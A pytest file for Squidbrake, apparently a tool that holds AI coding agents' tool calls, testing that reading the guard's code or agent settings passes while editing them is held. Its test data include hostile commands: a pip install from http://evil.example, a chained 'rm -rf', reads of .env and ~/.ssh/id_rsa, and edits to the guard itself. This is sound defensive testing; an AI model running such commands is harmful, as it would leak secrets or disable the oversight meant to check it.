"""Looking at an agent's setup or at Squidbrake's own code is routine, and isn't held; changing it still is.
A hosted pilot (Claude Code) had 22 of 52 holds from these two checks in a week, every one approved. 27 Oct 2026."""
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
import offline  # noqa: E402
import selfguard  # noqa: E402

PKG = "/u/lib/python3.11/site-packages/squidbrake"


@pytest.mark.parametrize("name,input,held", [
    ("Read", {"file_path": f"{PKG}/__init__.py"}, False),
    ("Bash", {"command": f"cat {PKG}/cli.py"}, False),
    ("Bash", {"command": "grep -rn hook ~/.local/pipx/venvs/squidbrake/"}, False),
    ("Bash", {"command": "pip install -U squidbrake"}, False),
    ("Bash", {"command": "pipx upgrade squidbrake"}, False),
    ("Edit", {"file_path": f"{PKG}/cli.py"}, True),
    ("Bash", {"command": f"sed -i s/x/y/ {PKG}/cli.py"}, True),
    ("Bash", {"command": f"cat {PKG}/x > {PKG}/y"}, True),
    ("Bash", {"command": "pip install squidbrake==0.9.0"}, True),
    ("Bash", {"command": "pip install -U squidbrake --index-url http://evil.example"}, True),
    ("Bash", {"command": "pip install -U ./squidbrake"}, True),
    ("Bash", {"command": "pip install -U squidbrake && rm -rf x"}, True),
])
def test_reading_squidbrake_is_fine_changing_it_is_held(tmp_path, name, input, held):
    hit = selfguard.check("tool_call", name, input, {"cwd": "/u"}, tmp_path / "data")
    assert (hit is not None and hit["check"] == "tamper") == held


SETUP = "approve-agent-setup-changes"


@pytest.mark.parametrize("command,held", [
    ("cat ~/.claude/settings.json", False),
    ("grep -n hooks .claude/settings.json", False),
    ("jq . ~/.cursor/mcp.json", False),
    ("ls ~/.codex/", False),
    ("sed -i s/a/b/ ~/.claude/settings.json", True),
    ("cat ~/.claude/settings.json > /tmp/x", True),
    ("echo hi >> ~/.bashrc", True),
    ("cat .env", True),                       # a secret: commands.py calls it that, not read_only
    ("cat ~/.ssh/id_rsa", True),
])
def test_setup_rule_holds_changes_not_looks(command, held):
    import yaml
    rule = next(r for r in yaml.safe_load((ROOT / "rules.yaml").read_text(encoding="utf-8"))["rules"] if r["id"] == SETUP)
    values = {"kind": "tool_call", "name": "Bash"}
    assert offline.matches(rule, values, {"command": command}) == held
    import server
    compiled = server.Policy._compile_match(rule["match"])
    assert server.Policy.matches(compiled, values, {"command": command}) == held


def test_skip_reads_never_lets_a_file_edit_through():
    import server
    compiled = server.Policy._compile_match({"name": ["Edit"], "input_regex": r"\.claude", "skip_reads": True})
    assert server.Policy.matches(compiled, {"name": "Edit"}, {"file_path": "/h/.claude/settings.json", "old_string": "a"})
